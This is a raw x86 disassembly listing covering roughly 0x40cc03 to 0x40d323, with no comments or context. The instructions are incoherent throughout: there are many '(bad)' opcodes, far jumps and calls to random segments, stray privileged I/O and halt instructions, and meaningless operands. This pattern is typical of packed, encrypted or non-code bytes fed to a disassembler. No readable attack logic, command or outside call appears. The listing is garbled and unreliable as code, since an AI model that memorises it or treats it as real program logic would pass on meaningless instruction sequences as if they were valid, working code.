  40cc03:	cmp    BYTE PTR [esi+edi*2+0x7e],bh
  40cc07:	jae    0x40cc45
  40cc09:	das    
  40cc0a:	sub    esi,ebx
  40cc0c:	test   al,0x5d
  40cc0e:	push   edx
  40cc0f:	int    0x46
  40cc11:	mov    ecx,0x25d4b981
  40cc16:	popa   
  40cc17:	scas   al,BYTE PTR es:[edi]
  40cc18:	mov    al,ds:0x4da1bf07
  40cc1d:	pop    es
  40cc1e:	enter  0x683a,0x7f
  40cc22:	mov    ds:0x60a7296b,eax
  40cc27:	jmp    0xc9c0:0x3e98f926
  40cc2e:	push   ds
  40cc2f:	clc    
  40cc30:	outs   dx,BYTE PTR ds:[esi]
  40cc31:	sbb    al,0x58
  40cc33:	lock sub dh,BYTE PTR [ebp-0x56ca1095]
  40cc3a:	aaa    
  40cc3b:	call   0x919a:0xdcfed639
  40cc42:	mov    ds:0xf1e4d47f,al
  40cc47:	xor    bh,BYTE PTR [bx+si]
  40cc4a:	jne    0x40cbfc
  40cc4c:	lds    ebx,FWORD PTR [ebx-0x6d842c29]
  40cc52:	lea    edi,[ecx+0x27e0d354]
  40cc58:	icebp  
  40cc59:	cmp    al,0x87
  40cc5b:	or     DWORD PTR [esi],eax
  40cc5d:	push   eax
  40cc5e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cc5f:	stos   BYTE PTR es:[edi],al
  40cc60:	and    DWORD PTR [ebx],ebp
  40cc62:	or     esp,esi
  40cc64:	fstp   QWORD PTR [esi+eax*8]
  40cc67:	add    al,0x54
  40cc69:	mov    ch,BYTE PTR [ecx-0x2f230aa7]
  40cc6f:	test   BYTE PTR [ebx],cl
  40cc71:	enter  0x3e4c,0xb4
  40cc75:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cc76:	adc    DWORD PTR [edx-0x42],edi
  40cc79:	lahf   
  40cc7a:	mov    WORD PTR [ecx+0x5c],es
  40cc7d:	sar    BYTE PTR [esi],1
  40cc7f:	and    BYTE PTR [edx-0x3e886f08],ch
  40cc85:	cmp    edx,ebx
  40cc87:	je     0x40ccee
  40cc89:	mov    al,ds:0xfdc0a1fd
  40cc8e:	lock mov dl,0x15
  40cc91:	cdq    
  40cc92:	ins    BYTE PTR es:[edi],dx
  40cc93:	dec    edi
  40cc94:	aad    0xd3
  40cc96:	jne    0x40cc9b
  40cc98:	xchg   DWORD PTR [esi-0x22],edi
  40cc9b:	push   edi
  40cc9c:	mov    ch,BYTE PTR [ecx-0x78]
  40cc9f:	xor    ebp,ebx
  40cca1:	inc    eax
  40cca2:	inc    eax
  40cca3:	stos   BYTE PTR es:[edi],al
  40cca4:	sub    dh,BYTE PTR [ebp+0x14]
  40cca7:	mov    WORD PTR [edx],cs
  40cca9:	xchg   esp,eax
  40ccaa:	mov    ah,0x9
  40ccac:	ds retf 
  40ccae:	rcr    DWORD PTR [ebp+0x44],0xa6
  40ccb2:	(bad)  
  40ccb3:	cs stos BYTE PTR es:[edi],al
  40ccb5:	sub    bh,BYTE PTR [eax-0x64]
  40ccb8:	mov    edi,DWORD PTR [esi-0x60]
  40ccbb:	push   esi
  40ccbc:	cmp    DWORD PTR [ebp-0x27016972],0xf0b1213c
  40ccc6:	js     0x40cd13
  40ccc8:	pop    esp
  40ccc9:	enter  0x2ae2,0x3f
  40cccd:	icebp  
  40ccce:	cwde   
  40cccf:	and    eax,0x5f463da2
  40ccd4:	sbb    al,0x50
  40ccd6:	sahf   
  40ccd7:	outs   dx,BYTE PTR ds:[esi]
  40ccd8:	or     bl,BYTE PTR [eax]
  40ccda:	jmp    0x40cd35
  40ccdc:	jle    0x40cc7f
  40ccde:	adc    eax,0xa3935ff2
  40cce3:	hlt    
  40cce4:	push   ss
  40cce5:	and    BYTE PTR [ebx+0xd023d80],cl
  40cceb:	into   
  40ccec:	sbb    al,0x89
  40ccee:	dec    BYTE PTR [ebp+0x5f]
  40ccf1:	fisubr DWORD PTR [edi]
  40ccf3:	fs cli 
  40ccf5:	int3   
  40ccf6:	cmp    al,0xa6
  40ccf8:	in     eax,dx
  40ccf9:	or     eax,0x6346e052
  40ccfe:	add    esp,DWORD PTR [eax-0x7ad3c596]
  40cd04:	xchg   BYTE PTR [ecx+0x46],ah
  40cd07:	fcmovb st,st(5)
  40cd09:	les    esi,FWORD PTR [ebp-0x6af26b74]
  40cd0f:	rcl    BYTE PTR [edi],cl
  40cd11:	ret    
  40cd12:	(bad)  
  40cd13:	shl    DWORD PTR [esi-0x43c763c3],cl
  40cd19:	call   0xa32:0xe1651816
  40cd20:	xlat   BYTE PTR ds:[ebx]
  40cd21:	dec    ecx
  40cd22:	sub    al,dh
  40cd24:	stos   DWORD PTR es:[edi],eax
  40cd25:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cd26:	mov    eax,ecx
  40cd28:	sub    esi,edi
  40cd2a:	dec    eax
  40cd2b:	jl     0x40cd39
  40cd2d:	not    BYTE PTR [ebx]
  40cd2f:	sub    BYTE PTR [ebx+0x14],bl
  40cd32:	xchg   ebp,eax
  40cd33:	push   cs
  40cd34:	ins    BYTE PTR es:[edi],dx
  40cd35:	shr    DWORD PTR [ebx-0x35ec1c0c],0x7d
  40cd3c:	fistp  DWORD PTR [edi+0x528c23ce]
  40cd42:	inc    eax
  40cd43:	pushf  
  40cd44:	mov    bl,BYTE PTR [edi+0x1cce323a]
  40cd4a:	or     DWORD PTR ds:0x6416bb6c,ecx
  40cd50:	jbe    0x40cd0f
  40cd52:	(bad)  
  40cd53:	dec    edi
  40cd54:	mov    BYTE PTR [ecx+0x55],0x60
  40cd58:	scas   al,BYTE PTR es:[edi]
  40cd59:	push   ebx
  40cd5a:	retfw  0x27f5
  40cd5e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cd5f:	pop    eax
  40cd60:	out    dx,al
  40cd61:	mov    ch,0xd
  40cd63:	fdivr  st,st(6)
  40cd65:	or     DWORD PTR [edx],edi
  40cd67:	jb     0x40cd7e
  40cd69:	(bad)  
  40cd6a:	fadd   DWORD PTR [ecx]
  40cd6c:	ror    edi,1
  40cd6e:	push   edx
  40cd6f:	(bad)  
  40cd70:	jecxz  0x40cd2e
  40cd72:	(bad)  
  40cd73:	xor    al,0xa4
  40cd75:	jne    0x40cd48
  40cd77:	xchg   ebx,eax
  40cd78:	sbb    al,BYTE PTR [ecx+0x1]
  40cd7b:	xor    DWORD PTR [edi+edi*8-0x3d69a170],esi
  40cd82:	cs aam 0x71
  40cd85:	inc    esi
  40cd86:	stos   BYTE PTR es:[edi],al
  40cd87:	push   edx
  40cd88:	sub    BYTE PTR ds:0x1d0b7f9b,0xe1
  40cd8f:	adc    al,0x5a
  40cd91:	or     al,0x5f
  40cd93:	adc    eax,0xbffeacdc
  40cd98:	xchg   DWORD PTR [eax],eax
  40cd9a:	or     al,0xa6
  40cd9c:	mul    esi
  40cd9e:	sar    DWORD PTR [eax],cl
  40cda0:	xchg   esi,eax
  40cda1:	sub    BYTE PTR [ebp-0x149935a0],0x66
  40cda8:	call   0xc8dc:0x4d5a68e5
  40cdaf:	adc    ah,dl
  40cdb1:	dec    esp
  40cdb2:	dec    ebp
  40cdb3:	sbb    dl,al
  40cdb5:	jnp    0x40cdb6
  40cdb7:	push   cs
  40cdb8:	mov    al,0x52
  40cdba:	out    0x32,al
  40cdbc:	inc    eax
  40cdbd:	shr    BYTE PTR [ecx+0x5a],1
  40cdc0:	lods   al,BYTE PTR ds:[esi]
  40cdc1:	jbe    0x40cdd8
  40cdc3:	pusha  
  40cdc4:	hlt    
  40cdc5:	jbe    0x40cd58
  40cdc7:	mov    bh,BYTE PTR [ebx-0x80]
  40cdca:	and    BYTE PTR [ecx+0x39],ch
  40cdcd:	or     al,0xff
  40cdcf:	into   
  40cdd0:	call   0x1b7feba4
  40cdd5:	fdiv   DWORD PTR [edi]
  40cdd7:	cmp    DWORD PTR [ebx+0x36],esi
  40cdda:	adc    BYTE PTR [edi-0x1cc4b491],dh
  40cde0:	xor    al,BYTE PTR [ecx]
  40cde2:	out    dx,al
  40cde3:	ret    0x5521
  40cde6:	sbb    BYTE PTR [ebx+0x5d],bl
  40cde9:	sub    dl,ch
  40cdeb:	jmp    0x7590:0x3beee193
  40cdf2:	dec    ebp
  40cdf3:	cmp    DWORD PTR [edx+0x52],ecx
  40cdf6:	inc    edi
  40cdf7:	mov    ah,0x95
  40cdf9:	ins    BYTE PTR es:[edi],dx
  40cdfa:	popf   
  40cdfb:	aas    
  40cdfc:	mov    al,0x22
  40cdfe:	aas    
  40cdff:	lea    ebp,[ecx+0x2c]
  40ce02:	or     ecx,DWORD PTR [edx]
  40ce04:	mov    edx,0xff064406
  40ce09:	inc    ecx
  40ce0a:	jne    0x40ce21
  40ce0c:	stc    
  40ce0d:	je     0x40ce18
  40ce0f:	out    dx,al
  40ce10:	jge    0x40ce62
  40ce12:	in     al,0x69
  40ce14:	cmp    DWORD PTR [eax-0x6b],ebx
  40ce17:	cmp    DWORD PTR [esi-0x63],ebx
  40ce1a:	cli    
  40ce1b:	xchg   esp,eax
  40ce1c:	aam    0x1c
  40ce1e:	dec    esi
  40ce1f:	jge    0x40ce29
  40ce21:	stos   BYTE PTR es:[edi],al
  40ce22:	out    0xdf,al
  40ce24:	xchg   edi,eax
  40ce25:	and    DWORD PTR [ebx+0x22],edi
  40ce28:	add    eax,0x88342d52
  40ce2d:	ror    BYTE PTR [esi-0x62c19c95],cl
  40ce33:	inc    eax
  40ce34:	xor    esp,ebx
  40ce36:	js     0x40ce2e
  40ce38:	jbe    0x40cdfa
  40ce3a:	outs   dx,BYTE PTR ds:[esi]
  40ce3b:	xchg   BYTE PTR [edi+0x41],bh
  40ce3e:	cmpxchg8b QWORD PTR [edi+0x849626b]
  40ce45:	fdivr  DWORD PTR ds:[edx+0x39]
  40ce49:	cmc    
  40ce4a:	sub    DWORD PTR [eax*1-0x347826d5],ebx
  40ce51:	jmp    0x40d0b4
  40ce56:	push   ebx
  40ce57:	std    
  40ce58:	dec    ebx
  40ce59:	sahf   
  40ce5a:	push   ecx
  40ce5b:	push   0x84027173
  40ce60:	add    al,0xed
  40ce62:	mov    BYTE PTR [edx],ch
  40ce64:	cld    
  40ce65:	mov    al,0x2c
  40ce67:	mov    edi,DWORD PTR [esi+0x7e]
  40ce6a:	cmp    BYTE PTR [esi+edi*2+0x7e],bh
  40ce6e:	mov    ebp,0x32582e0a
  40ce73:	clc    
  40ce74:	mov    cl,0x6d
  40ce76:	sbb    al,al
  40ce78:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ce79:	xchg   BYTE PTR [esi+ebp*1-0x11901bb2],bh
  40ce80:	cdq    
  40ce81:	ror    BYTE PTR [edx+0x293f82b9],0xd3
  40ce88:	jge    0x40ce14
  40ce8a:	(bad)  
  40ce8b:	cwde   
  40ce8c:	mov    esp,0x31d1b3f6
  40ce91:	or     ah,0xa5
  40ce94:	not    DWORD PTR [edi]
  40ce96:	mov    bl,ch
  40ce98:	out    dx,eax
  40ce99:	adc    bh,bh
  40ce9b:	lods   al,BYTE PTR ds:[esi]
  40ce9c:	hlt    
  40ce9d:	and    bh,BYTE PTR ds:0x76ddfbeb
  40cea3:	loop   0x40cef4
  40cea5:	xchg   esi,eax
  40cea6:	mov    ah,0x65
  40cea8:	lds    edi,FWORD PTR [edx]
  40ceaa:	aam    0xc7
  40ceac:	and    ebx,DWORD PTR [esi+edx*2+0x7b]
  40ceb0:	bound  edx,QWORD PTR [ebx+ecx*8+0x49]
  40ceb4:	jnp    0x40ce86
  40ceb6:	xchg   esp,eax
  40ceb7:	jae    0x40ceaa
  40ceb9:	test   DWORD PTR [ebx+0x1bbd8827],edx
  40cebf:	ret    
  40cec0:	ror    edx,1
  40cec2:	and    DWORD PTR [ebp+ebx*8-0x2e07e4cb],ebp
  40cec9:	(bad)  
  40ceca:	cmp    ebp,DWORD PTR [edx]
  40cecc:	outs   dx,BYTE PTR ds:[esi]
  40cecd:	add    BYTE PTR [ebx-0x2fe6ad5c],0x1f
  40ced4:	mov    al,ds:0x74296d1b
  40ced9:	(bad)  [eax+0x8]
  40cedc:	mov    BYTE PTR [ebp-0x78dfe2fc],ah
  40cee2:	jnp    0x40cee2
  40cee4:	sub    ebx,DWORD PTR [eax-0x16e804ea]
  40ceea:	dec    ebp
  40ceeb:	cmp    BYTE PTR [ecx],dh
  40ceed:	les    esi,FWORD PTR [edx-0x6a22b61d]
  40cef3:	cmp    eax,0x7ed7ec46
  40cef8:	sub    bl,ch
  40cefa:	out    dx,al
  40cefb:	dec    esp
  40cefc:	je     0x40cf32
  40cefe:	push   edx
  40ceff:	test   eax,0x9445b4f4
  40cf04:	push   ebp
  40cf05:	and    eax,DWORD PTR [edx-0x397e5b40]
  40cf0b:	xchg   esi,eax
  40cf0c:	pop    ebx
  40cf0d:	sub    eax,0xf6693ca2
  40cf12:	pop    edi
  40cf13:	inc    ebx
  40cf14:	xor    eax,0x4f9242de
  40cf19:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cf1a:	mov    ah,0xfc
  40cf1c:	enter  0x850d,0xb8
  40cf20:	enter  0xc0d9,0x84
  40cf24:	in     eax,0xf4
  40cf26:	iret   
  40cf27:	xor    BYTE PTR [ecx],0x65
  40cf2a:	cli    
  40cf2b:	or     eax,0x686f0d27
  40cf30:	dec    edi
  40cf31:	fs xchg ecx,eax
  40cf33:	test   al,0xc8
  40cf35:	fbld   TBYTE PTR [eax]
  40cf37:	adc    al,BYTE PTR [edx+esi*8-0x54bcec52]
  40cf3e:	sub    bh,BYTE PTR [ecx-0x428167cc]
  40cf44:	in     al,dx
  40cf45:	leave  
  40cf46:	jmp    0x4e848baa
  40cf4b:	add    cl,BYTE PTR [edi+0x65a253fb]
  40cf51:	add    DWORD PTR [esi],ecx
  40cf53:	adc    DWORD PTR [esi+0x1a],ecx
  40cf56:	inc    ecx
  40cf57:	out    dx,eax
  40cf58:	rcr    BYTE PTR [ebx],cl
  40cf5a:	(bad)  
  40cf5b:	in     al,0x1
  40cf5d:	inc    edi
  40cf5e:	iret   
  40cf5f:	rcl    BYTE PTR [esi+0x10d5042b],1
  40cf65:	ret    0xce33
  40cf68:	or     DWORD PTR [esp+edi*4],0x13
  40cf6c:	push   edx
  40cf6d:	pop    ebx
  40cf6e:	enter  0xe563,0x1a
  40cf72:	adc    dl,BYTE PTR [ecx]
  40cf74:	gs push eax
  40cf76:	cs jl  0x40cf6f
  40cf79:	test   eax,0x4372cc59
  40cf7e:	sub    BYTE PTR [ecx+0x60cb88da],ah
  40cf84:	int    0x4d
  40cf86:	jg     0x40cf94
  40cf88:	cwde   
  40cf89:	dec    esi
  40cf8a:	loopne 0x40cf15
  40cf8c:	xor    al,0x42
  40cf8e:	xchg   ebp,eax
  40cf8f:	xchg   esi,eax
  40cf90:	mov    DWORD PTR ds:0xba74212a,ebx
  40cf96:	xchg   ebx,eax
  40cf97:	pusha  
  40cf98:	test   al,0x1c
  40cf9a:	adc    BYTE PTR [edi+0x37],dh
  40cf9d:	add    BYTE PTR [ebp+0x3e],ch
  40cfa0:	sub    bl,dh
  40cfa2:	or     BYTE PTR [ecx],cl
  40cfa4:	jmp    0x2cde19f3
  40cfa9:	xlat   BYTE PTR ds:[ebx]
  40cfaa:	fwait
  40cfab:	ss and al,0x23
  40cfae:	retf   0x74ec
  40cfb1:	rcr    esp,0xfc
  40cfb4:	gs jmp 0x40cf52
  40cfb7:	cdq    
  40cfb8:	das    
  40cfb9:	push   edi
  40cfba:	xor    al,ah
  40cfbc:	push   es
  40cfbd:	xchg   ecx,eax
  40cfbe:	dec    eax
  40cfbf:	nop
  40cfc0:	xchg   BYTE PTR ds:0x8d98c61d,dl
  40cfc6:	call   0x3648599b
  40cfcb:	pop    esp
  40cfcc:	ins    DWORD PTR es:[edi],dx
  40cfcd:	xchg   BYTE PTR [ebp+0x34],ah
  40cfd0:	lock or esi,DWORD PTR [ebp-0x2ca3eb4f]
  40cfd7:	aam    0xa8
  40cfd9:	inc    esp
  40cfda:	add    al,0xc2
  40cfdc:	add    al,0x19
  40cfde:	sbb    DWORD PTR [ecx],0x22
  40cfe1:	sbb    ah,dh
  40cfe3:	push   ebx
  40cfe4:	xor    BYTE PTR [edi],ah
  40cfe6:	arpl   WORD PTR [ecx+0x6a],dx
  40cfe9:	jecxz  0x40cfdb
  40cfeb:	pop    ds
  40cfec:	mov    WORD PTR [ebx+0x583c39d3],gs
  40cff2:	inc    ebp
  40cff3:	popf   
  40cff4:	das    
  40cff5:	hlt    
  40cff6:	iret   
  40cff7:	xchg   ecx,eax
  40cff8:	xlat   BYTE PTR ds:[ebx]
  40cff9:	inc    esp
  40cffa:	ret    0x95d0
  40cffd:	shr    DWORD PTR [ecx-0xa],1
  40d000:	xchg   edx,eax
  40d001:	or     dh,BYTE PTR [edx+eax*1-0x7c279700]
  40d008:	loopne 0x40d033
  40d00a:	pop    ebp
  40d00b:	js     0x40d002
  40d00d:	push   ebp
  40d00e:	cmp    bl,dh
  40d010:	cmp    edi,DWORD PTR [edi]
  40d012:	mov    esi,0xf7e53549
  40d017:	xchg   esp,eax
  40d018:	ds jl  0x40cff0
  40d01b:	sbb    ch,BYTE PTR [ebx+0x57c5b3bb]
  40d021:	fcmovne st,st(4)
  40d023:	jecxz  0x40d066
  40d025:	sbb    BYTE PTR [ebp+0x68],ah
  40d028:	xchg   ebp,eax
  40d029:	dec    esp
  40d02a:	das    
  40d02b:	ret    
  40d02c:	pop    edi
  40d02d:	cld    
  40d02e:	or     al,0x2e
  40d030:	sbb    eax,0x9d8846f0
  40d035:	jne    0x40d054
  40d037:	add    cl,ch
  40d039:	in     al,0x56
  40d03b:	inc    eax
  40d03c:	or     eax,0x1e6fd5f6
  40d041:	mov    ds:0xae367ddc,eax
  40d046:	inc    ebx
  40d047:	jmp    0x18b3a8ad
  40d04c:	dec    eax
  40d04d:	lods   al,BYTE PTR ds:[esi]
  40d04e:	adc    BYTE PTR [edi+0x66],ch
  40d051:	sub    bh,dh
  40d053:	jmp    0x40d09d
  40d055:	inc    ebx
  40d056:	outs   dx,DWORD PTR ds:[esi]
  40d057:	and    bl,0xf9
  40d05a:	ret    
  40d05b:	sbb    eax,eax
  40d05d:	cmp    al,0x5
  40d05f:	je     0x40d016
  40d061:	sti    
  40d062:	mov    bl,0x98
  40d064:	cmp    DWORD PTR [ebx],edx
  40d066:	add    eax,0x16ef79c2
  40d06b:	mov    ah,0x67
  40d06d:	cmc    
  40d06e:	xor    cl,BYTE PTR [ebx+0xe]
  40d071:	inc    esp
  40d072:	dec    esp
  40d073:	sbb    DWORD PTR [edx],eax
  40d075:	push   0xc1e80408
  40d07a:	daa    
  40d07b:	fwait
  40d07c:	cmp    eax,0xfe78a40a
  40d081:	xor    DWORD PTR [ecx+0x49],ebx
  40d084:	xchg   ebx,eax
  40d085:	dec    esp
  40d086:	push   esi
  40d087:	jmp    0xbfaf5d29
  40d08c:	imul   edx,ebx,0x7778dab0
  40d092:	and    dl,cl
  40d094:	pop    DWORD PTR [ebp+ebx*4+0x48]
  40d098:	sbb    ch,bh
  40d09a:	inc    ebx
  40d09b:	fnsave [ecx+0x3b]
  40d09e:	(bad)  
  40d09f:	repnz sbb dl,BYTE PTR [ebx-0xb]
  40d0a3:	jae    0x40d100
  40d0a5:	mov    al,ds:0x78657bc2
  40d0aa:	mov    cl,0x70
  40d0ac:	push   cs
  40d0ad:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d0ae:	(bad)  
  40d0af:	pushf  
  40d0b0:	mov    edi,DWORD PTR [ebx-0x44]
  40d0b3:	test   BYTE PTR [ecx-0x75],cl
  40d0b6:	inc    ebp
  40d0b7:	in     al,0xf
  40d0b9:	scas   eax,DWORD PTR es:[edi]
  40d0ba:	rol    DWORD PTR [ebx],0xe0
  40d0bd:	xchg   edx,eax
  40d0be:	jmp    0x40d321
  40d0c3:	sahf   
  40d0c4:	test   BYTE PTR [edi],0xc3
  40d0c7:	push   edi
  40d0c8:	repz pop edx
  40d0ca:	jae    0x40d0bf
  40d0cc:	ficom  WORD PTR [edx+0x6a]
  40d0cf:	add    BYTE PTR [edx-0x76090082],al
  40d0d5:	jle    0x40d155
  40d0d7:	cmp    BYTE PTR [esi+edi*2+0x7e],bh
  40d0db:	dec    ecx
  40d0dc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d0dd:	push   0xffffffb1
  40d0df:	mov    ch,0x9d
  40d0e1:	mov    cl,ch
  40d0e3:	shl    edi,1
  40d0e5:	and    ebp,esp
  40d0e7:	mov    ebp,0x9f5a9138
  40d0ec:	sbb    eax,0xb4d3ee70
  40d0f1:	mov    ebp,0x7188439a
  40d0f6:	repz aaa 
  40d0f8:	cli    
  40d0f9:	in     al,dx
  40d0fa:	ror    DWORD PTR [ebx],1
  40d0fc:	lods   eax,DWORD PTR ds:[esi]
  40d0fd:	stos   DWORD PTR es:[edi],eax
  40d0fe:	das    
  40d0ff:	push   esi
  40d100:	mov    eax,0x70a6d9af
  40d105:	jg     0x40d0d5
  40d107:	push   ss
  40d108:	(bad)  
  40d109:	pop    es
  40d10a:	ficomp WORD PTR [esp+eiz*2]
  40d10d:	lods   eax,DWORD PTR ds:[esi]
  40d10e:	jno    0x40d16f
  40d110:	xor    BYTE PTR [ebx-0x432dca2a],bh
  40d116:	bound  eax,QWORD PTR [esi]
  40d118:	leave  
  40d119:	(bad)  
  40d11a:	in     eax,dx
  40d11b:	mov    ecx,0xcf71e08c
  40d120:	(bad)  
  40d121:	clc    
  40d122:	mov    ebx,0xbe0b9382
  40d127:	xor    al,0x9f
  40d129:	xchg   DWORD PTR [edi+0x7e],edi
  40d12c:	xor    al,0x66
  40d12e:	pop    ebx
  40d12f:	sar    BYTE PTR [eax+ebx*2-0x4f85c0d2],0x62
  40d137:	sub    al,0x74
  40d139:	sbb    DWORD PTR [esi],esi
  40d13b:	in     al,dx
  40d13c:	pop    ecx
  40d13d:	call   0x52b2:0xe18100d7
  40d144:	push   ebp
  40d145:	add    eax,esi
  40d147:	mov    ch,bl
  40d149:	js     0x40d17b
  40d14b:	(bad)  
  40d14c:	jns    0x40d159
  40d14e:	adc    al,0xef
  40d150:	in     al,dx
  40d151:	loopne 0x40d11a
  40d153:	out    0x5a,eax
  40d155:	(bad)  
  40d156:	ror    edi,cl
  40d158:	and    al,0xe7
  40d15a:	shr    DWORD PTR [ebx-0x79967e02],cl
  40d160:	adc    al,0x40
  40d162:	mov    ebp,0x6a33ad
  40d167:	ins    DWORD PTR es:[edi],dx
  40d168:	mov    al,ds:0x74ffd1e7
  40d16d:	push   es
  40d16e:	sub    al,0xc9
  40d170:	mov    ah,0x44
  40d172:	dec    edx
  40d173:	sbb    eax,0xc136ee75
  40d178:	loope  0x40d143
  40d17a:	imul   edx,edx,0xffffffa6
  40d17d:	cld    
  40d17e:	xor    eax,0xa8232160
  40d183:	in     eax,dx
  40d184:	or     al,0xf5
  40d186:	add    bh,dh
  40d188:	pop    ebp
  40d189:	enter  0x34e,0x37
  40d18d:	mov    BYTE PTR [ebx],dh
  40d18f:	mov    al,ds:0x15bb7599
  40d194:	pop    edx
  40d195:	push   eax
  40d196:	in     eax,0xba
  40d198:	stos   DWORD PTR es:[edi],eax
  40d199:	push   cs
  40d19a:	pop    eax
  40d19b:	test   DWORD PTR [esi],edi
  40d19d:	aad    0x9c
  40d19f:	in     al,dx
  40d1a0:	sub    ah,dl
  40d1a2:	fisttp WORD PTR [ecx-0x34]
  40d1a5:	(bad)  
  40d1a6:	sbb    cl,BYTE PTR [ebx]
  40d1a8:	adc    bh,BYTE PTR [ecx+0x17]
  40d1ab:	repz or ebx,edi
  40d1ae:	sbb    al,0x22
  40d1b0:	mov    DWORD PTR [eax+eiz*2+0x14],ecx
  40d1b4:	mov    bl,0x8d
  40d1b6:	add    ch,BYTE PTR [ebp+0x5b29f213]
  40d1bc:	mov    al,ds:0x9beea89
  40d1c1:	sbb    edi,ebp
  40d1c3:	pushf  
  40d1c4:	mov    esi,0x5429404f
  40d1c9:	scas   al,BYTE PTR es:[edi]
  40d1ca:	out    dx,al
  40d1cb:	add    eax,0x76a06f86
  40d1d0:	xor    al,0x82
  40d1d2:	xor    DWORD PTR [edi],ebx
  40d1d4:	jl     0x40d1e9
  40d1d6:	push   es
  40d1d7:	sbb    DWORD PTR [esi+ebx*1+0x4b415610],ebx
  40d1de:	ret    
  40d1df:	mov    eax,0x50da6381
  40d1e4:	mov    fs,WORD PTR [ecx-0x7b]
  40d1e7:	or     eax,0x36cf5284
  40d1ec:	repnz retf 0x1973
  40d1f0:	adc    ch,BYTE PTR [ecx]
  40d1f2:	in     eax,0x7a
  40d1f4:	aaa    
  40d1f5:	fdivp  st(5),st
  40d1f7:	inc    ebp
  40d1f8:	ret    
  40d1f9:	push   esp
  40d1fa:	cld    
  40d1fb:	icebp  
  40d1fc:	lar    ebp,WORD PTR [ebx]
  40d1ff:	dec    edx
  40d200:	or     BYTE PTR [ebp+eiz*8+0x1dd6a097],bl
  40d207:	gs out 0x57,eax
  40d20a:	and    BYTE PTR [edx],cl
  40d20c:	and    ch,dl
  40d20e:	bound  edx,QWORD PTR [edi+edi*1]
  40d211:	mov    edx,0xbc782c46
  40d216:	(bad)  
  40d217:	shr    BYTE PTR [edx-0x6],cl
  40d21a:	imul   esi,DWORD PTR [ecx+edi*1+0x23c3b2e3],0x40
  40d222:	mov    DWORD PTR [ecx],edi
  40d224:	and    bl,BYTE PTR [esi+ebp*8]
  40d227:	mov    ebx,0x46fbdf0f
  40d22c:	pop    esi
  40d22d:	mov    ds,WORD PTR [ecx+0x7d]
  40d230:	neg    DWORD PTR [ebx+0x60]
  40d233:	xor    dl,BYTE PTR ds:0x8a64e988
  40d239:	(bad)  
  40d23a:	and    esi,DWORD PTR [esi-0x9a7c365]
  40d240:	mov    ebp,0xe02016a6
  40d245:	call   esp
  40d247:	mov    WORD PTR [eax+0x4006c08e],gs
  40d24d:	out    0x4e,al
  40d24f:	out    0x6f,eax
  40d251:	push   es
  40d252:	push   ss
  40d253:	je     0x40d278
  40d255:	nop
  40d256:	dec    eax
  40d257:	jb     0x40d29e
  40d259:	push   ss
  40d25a:	scas   al,BYTE PTR es:[edi]
  40d25b:	test   eax,0x7a39ce38
  40d260:	inc    ecx
  40d261:	sbb    edi,DWORD PTR [ecx]
  40d263:	cmp    eax,0x56eae7fa
  40d268:	xchg   esi,eax
  40d269:	(bad)  
  40d26a:	or     al,0x2d
  40d26c:	mov    edx,0x1348b16f
  40d271:	test   al,0x55
  40d273:	sbb    al,0xe0
  40d275:	std    
  40d276:	and    BYTE PTR [esp+ebx*4],ch
  40d279:	stos   DWORD PTR es:[edi],eax
  40d27a:	adc    ebx,DWORD PTR [ebp+0x5a2a54c3]
  40d280:	sub    eax,0x28c4c25d
  40d285:	shl    BYTE PTR [eax],cl
  40d287:	jbe    0x40d21b
  40d289:	inc    esp
  40d28a:	jg     0x40d222
  40d28c:	pop    esi
  40d28d:	pop    eax
  40d28e:	inc    ebx
  40d28f:	loope  0x40d2d9
  40d291:	sbb    BYTE PTR [edx],ch
  40d293:	cli    
  40d294:	inc    edi
  40d295:	enter  0xf1d2,0x29
  40d299:	enter  0x6a1b,0xc
  40d29d:	lea    esp,[esi+0x43c95b74]
  40d2a3:	xchg   ecx,eax
  40d2a4:	xor    BYTE PTR [edi+edi*4-0x54],0xa9
  40d2a9:	dec    ebx
  40d2aa:	jge    0x40d25c
  40d2ac:	xchg   edi,eax
  40d2ad:	dec    DWORD PTR [ebx+ecx*8]
  40d2b0:	out    dx,al
  40d2b1:	into   
  40d2b2:	js     0x40d272
  40d2b4:	push   ecx
  40d2b5:	xchg   edi,eax
  40d2b6:	inc    edx
  40d2b7:	out    dx,eax
  40d2b8:	cmp    edi,ecx
  40d2ba:	ret    
  40d2bb:	hlt    
  40d2bc:	out    dx,eax
  40d2bd:	fwait
  40d2be:	pusha  
  40d2bf:	mov    al,ch
  40d2c1:	mov    dh,0x32
  40d2c3:	(bad)  
  40d2c4:	loopne 0x40d2be
  40d2c6:	fisub  DWORD PTR ds:0x33a7fac
  40d2cc:	scas   eax,DWORD PTR es:[edi]
  40d2cd:	push   edi
  40d2ce:	cmc    
  40d2cf:	xchg   esi,eax
  40d2d0:	sbb    ecx,DWORD PTR [esi+eiz*2-0x47b3606b]
  40d2d7:	repnz xchg ecx,esp
  40d2da:	pop    ss
  40d2db:	imul   edx,DWORD PTR [ecx-0x3c2aa14d],0x1b2230aa
  40d2e5:	sbb    ebx,esp
  40d2e7:	xchg   ebp,eax
  40d2e8:	int3   
  40d2e9:	mov    bl,0xf9
  40d2eb:	bound  edx,QWORD PTR [esi-0x39]
  40d2ee:	push   ebp
  40d2ef:	jb     0x40d2c7
  40d2f1:	push   ecx
  40d2f2:	aad    0xf0
  40d2f4:	cmp    ah,BYTE PTR [ecx+ecx*8-0x26]
  40d2f8:	inc    esp
  40d2f9:	out    dx,eax
  40d2fa:	stc    
  40d2fb:	aaa    
  40d2fc:	fisttp DWORD PTR [ebx-0x70745886]
  40d302:	jbe    0x40d33b
  40d304:	lods   eax,DWORD PTR ds:[esi]
  40d305:	call   0xa73956ec
  40d30a:	addr16 test ebp,esi
  40d30d:	leave  
  40d30e:	dec    esi
  40d30f:	clc    
  40d310:	or     edi,DWORD PTR [ebx]
  40d312:	add    esi,DWORD PTR [edx+eiz*8-0x7b]
  40d316:	jno    0x40d37e
  40d318:	fstp   QWORD PTR [esi+0x7f]
  40d31b:	mov    edx,0x33a35efe
  40d320:	or     BYTE PTR [eax+0x33],dl
  40d323:	fisttp DWORD PTR [ebx+0x5ee94ad4]
